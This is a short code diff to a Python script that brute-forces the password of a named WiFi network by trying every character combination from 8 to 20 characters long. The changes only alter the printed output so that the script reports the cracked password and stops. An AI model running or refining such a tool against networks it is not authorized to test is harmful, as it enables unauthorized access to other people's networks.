@@ -56,6 +56,9 @@ if __name__ == "__main__":
     ssid = sys.argv[1]
     timeout = 2  # Timeout in seconds
 
+    print(f"Attempting to crack {sys.argv[1]}")
+    print("")
+
     all_chars = string.ascii_letters + string.digits + string.punctuation
 
     for length in range(8, 21):  # Start at 8 characters and end at 20 characters (inclusive)
@@ -65,6 +68,9 @@ if __name__ == "__main__":
             print(f"trying {password}")
 
             if is_wifi_password_correct(ssid, password, timeout):
-                print("The WiFi password is correct.")
+                print(f"The WiFi password is correct - {password}")
+                break
             else:
-                print("The WiFi password is incorrect.")
+                print("incorrect.")
+
+            print("")
